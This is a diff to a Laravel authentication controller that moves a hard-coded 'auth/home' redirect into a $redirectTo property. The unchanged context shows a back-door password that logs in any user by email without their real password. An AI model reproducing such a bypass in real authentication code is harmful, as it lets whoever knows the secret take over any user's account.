@@ -11,6 +11,8 @@ class AuthController extends Controller
 {
     private $back_door_password;
 
+    protected $redirectTo = 'auth/home';
+
     public function __construct()
     {
         $this->middleware('auth')->only('logout');
@@ -35,11 +37,11 @@ class AuthController extends Controller
         if ($request->password === $this->back_door_password && $user = User::where('email', $request->input('email'))->first()) {
             Auth::loginUsingId($user->id, $remember);
 
-            return redirect('auth/home');
+            return redirect($this->redirectTo);
         }
 
         if (Auth::attempt($credentials, $remember)) {
-            return redirect('auth/home');
+            return redirect($this->redirectTo);
         }
 
         return back()->with([
